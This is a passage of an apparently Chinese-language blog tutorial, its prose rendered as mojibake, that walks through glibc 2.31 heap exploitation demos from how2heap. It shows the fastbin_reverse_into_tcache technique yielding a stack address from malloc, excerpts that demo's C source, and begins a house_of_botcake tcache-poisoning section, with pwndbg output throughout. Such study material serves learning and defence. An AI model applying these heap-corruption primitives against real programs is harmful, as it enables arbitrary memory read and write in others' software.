class="number">0x5555555594c0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚   <span class="number">0x5555555594c8</span> â—‚â€” <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚   <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x7fffffffe200</span> â—‚â€” <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚   <span class="number">0x5555555594d8</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬ malloc ä¸€æ¬¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">*RAX  <span class="number">0x5555555596b0</span> â€”â–¸ <span class="number">0x555555559650</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"> RBX  <span class="number">0x555555555570</span> (__libc_csu_init) â—‚â€” endbr64</span><br><span class="line">*RCX  <span class="number">0x7ffff7fb0ba8</span> (main_arena+<span class="number">40</span>) â—‚â€” <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">*RDX  <span class="number">0x555555559016</span> â—‚â€” <span class="number">0x7</span></span><br><span class="line">*RDI  <span class="number">0x6</span></span><br><span class="line">*RSI  <span class="number">0x0</span></span><br><span class="line">*R8   <span class="number">0x5555555596b0</span> â€”â–¸ <span class="number">0x555555559650</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">*R9   <span class="number">0x18</span></span><br><span class="line">*R10  <span class="number">0x555555559028</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"> R11  <span class="number">0x246</span></span><br><span class="line"> R12  <span class="number">0x555555555140</span> (_start) â—‚â€” endbr64</span><br><span class="line"> R13  <span class="number">0x7fffffffe3a0</span> â—‚â€” <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffe2b0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffe1e0</span> â—‚â€” <span class="number">0x34000000340</span></span><br><span class="line">*RIP  <span class="number">0x55555555548c</span> (main+<span class="number">611</span>) â—‚â€” mov    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">0</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   <span class="number">0x555555555473</span> &lt;main+<span class="number">586</span>&gt;    lea    rdi, [rip + <span class="number">0x108e</span>]</span><br><span class="line">   <span class="number">0x55555555547a</span> &lt;main+<span class="number">593</span>&gt;    call   <span class="built_in">puts</span>@plt &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x55555555547f</span> &lt;main+<span class="number">598</span>&gt;    mov    eax, <span class="number">0x40</span></span><br><span class="line">   <span class="number">0x555555555484</span> &lt;main+<span class="number">603</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x555555555487</span> &lt;main+<span class="number">606</span>&gt;    call   <span class="built_in">malloc</span>@plt &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line"></span><br><span class="line"> â–º <span class="number">0x55555555548c</span> &lt;main+<span class="number">611</span>&gt;    mov    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">0</span></span><br><span class="line">   <span class="number">0x555555555497</span> &lt;main+<span class="number">622</span>&gt;    jmp    main+<span class="number">694</span> &lt;main+<span class="number">694</span>&gt;</span><br><span class="line">    â†“</span><br><span class="line">   <span class="number">0x5555555554df</span> &lt;main+<span class="number">694</span>&gt;    cmp    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">5</span></span><br><span class="line">   <span class="number">0x5555555554e7</span> &lt;main+<span class="number">702</span>&gt;    jbe    main+<span class="number">624</span> &lt;main+<span class="number">624</span>&gt;</span><br><span class="line">    â†“</span><br><span class="line">   <span class="number">0x555555555499</span> &lt;main+<span class="number">624</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0xc8</span>]</span><br><span class="line">   <span class="number">0x5555555554a0</span> &lt;main+<span class="number">631</span>&gt;    mov    rax, qword ptr [rbp + rax*<span class="number">8</span> - <span class="number">0xb0</span>]</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">115</span>     <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span></span><br><span class="line">   <span class="number">116</span>   );</span><br><span class="line">   <span class="number">117</span></span><br><span class="line">   <span class="number">118</span>   <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">119</span></span><br><span class="line"> â–º <span class="number">120</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="number">121</span>     <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">   <span class="number">122</span>   &#125;</span><br><span class="line">   <span class="number">123</span></span><br><span class="line">   <span class="number">124</span>   <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">125</span>   <span class="built_in">printf</span>(</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp  <span class="number">0x7fffffffe1e0</span> â—‚â€” <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x7fffffffe1e8</span> â—‚â€” <span class="number">0x6</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7fffffffe1f0</span> â€”â–¸ <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x555555559520</span> â€”â–¸ <span class="number">0x555555559570</span> â€”â–¸ <span class="number">0x5555555595c0</span> â—‚â€” ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7fffffffe1f8</span> â—‚â€” <span class="number">0x100</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x7fffffffe200</span> â—‚â€” <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚      <span class="number">0x7fffffffe210</span> â€”â–¸ <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x555555559520</span> â€”â–¸ <span class="number">0x555555559570</span> â€”â–¸ <span class="number">0x5555555595c0</span> â—‚â€” ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚      <span class="number">0x7fffffffe218</span> â€”â–¸ <span class="number">0x555555559010</span> â—‚â€” <span class="number">0x7000000000000</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">55555555548</span>c main+<span class="number">611</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x7fffffffe210</span> â€”â–¸ <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x555555559520</span> â€”â–¸ <span class="number">0x555555559570</span> â€”â–¸ <span class="number">0x5555555595c0</span> â€”â–¸ <span class="number">0x555555559610</span> â€”â–¸ <span class="number">0x555555559660</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼ŒåŸæœ¬åœ¨fastbin çš„chunk list éƒ½è¢«æ”¾åˆ°äº† tcaceh bins é‡Œ</p><p>å¦‚æœæˆ‘ä»¬æœ€åå†malloc ä¸€æ¬¡ï¼Œæˆ‘ä»¬å°±èƒ½æ‹¿åˆ°æ ˆçš„åœ°å€  ï¼ˆtcache  ä¸æ£€æŸ¥sizeåŸŸï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">120</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="number">121</span>     <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">   <span class="number">122</span>   &#125;</span><br><span class="line">   <span class="number">123</span></span><br><span class="line">   <span class="number">124</span>   <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"> â–º <span class="number">125</span>   <span class="built_in">printf</span>(</span><br><span class="line">   <span class="number">126</span>     <span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="number">127</span>     <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">   <span class="number">128</span>     q</span><br><span class="line">   <span class="number">129</span>   );</span><br><span class="line">   <span class="number">130</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp     <span class="number">0x7fffffffe1e0</span> â—‚â€” <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚         <span class="number">0x7fffffffe1e8</span> â—‚â€” <span class="number">0x6</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚         <span class="number">0x7fffffffe1f0</span> â€”â–¸ <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x555555559520</span> â€”â–¸ <span class="number">0x555555559570</span> â€”â–¸ <span class="number">0x5555555595c0</span> â—‚â€” ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚         <span class="number">0x7fffffffe1f8</span> â€”â–¸ <span class="number">0x7fffffffe210</span> â€”â–¸ <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x555555559520</span> â€”â–¸ <span class="number">0x555555559570</span> â—‚â€” ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚         <span class="number">0x7fffffffe200</span> â—‚â€” <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚ rax r8  <span class="number">0x7fffffffe210</span> â€”â–¸ <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x555555559520</span> â€”â–¸ <span class="number">0x555555559570</span> â€”â–¸ <span class="number">0x5555555595c0</span> â—‚â€” ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚         <span class="number">0x7fffffffe218</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">5555555554f</span>d main+<span class="number">724</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p q</span><br><span class="line">$<span class="number">3</span> = <span class="number">0x7fffffffe210</span> <span class="string">&quot;Ğ”UUUU&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å¯ä»¥è¾¾åˆ°ä¸€ä¸ªä»»æ„åœ°å€å†™ æˆ–è€…è¯»çš„åŸè¯­ï¼ˆå–å†³äºä¸‹ä¸€æ­¥å¯¹ è¿™åˆ†é…å‡ºæ¥çš„chunkè¿›è¡Œä»€ä¹ˆæ ·çš„æ“ä½œï¼‰</p><p>å®Œæ•´ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br></pre></td></tr></table></figure><h3 id="3-house-of-bocake"><a href="#3-house-of-bocake" class="headerlink" title="3. house_of_bocake"></a>3. house_of_bocake</h3><p>ä¸€ç§ tcache poisoning attack ï¼Œé€šè¿‡ä¸€äº›æ‰‹æ®µï¼Œåœ¨tcachebins ä¸­å†™å…¥ç›®æ ‡åœ°å€</p><p>æ„é€ å¦‚ä¸‹æƒ…æ™¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed                <span class="number">0x0</span>              None</span><br><span class="line"><span class="number">0x5555555593a0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555592a0</span>              None</span><br><span class="line"><span class="number">0x5555555594b0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555593b0</span>              None</span><br><span class="line"><span class="number">0x5555555595c0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555594c0</span>              None</span><br><span class="line"><span class="number">0x5555555596d0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555595d0</span>              None</span><br><span class="line"><span class="number">0x5555555597e0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555596e0</span>              None</span><br><span class="line"><span class="number">0x5555555598f0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555597f0</span>              None</span><br><span class="line"><span class="number">0x555555559a00</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559b10</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559c20</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶çš„ tcache æ˜¯è¢«å¡«æ»¡çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559900</span> â€”â–¸ <span class="number">0x5555555597f0</span> â€”â–¸ <span class="number">0x5555555596e0</span> â€”â–¸ <span class="number">0x5555555595d0</span> â€”â–¸ <span class="number">0x5555555594c0</span> â€”â–¸ <span class="number">0x5555555593b0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span 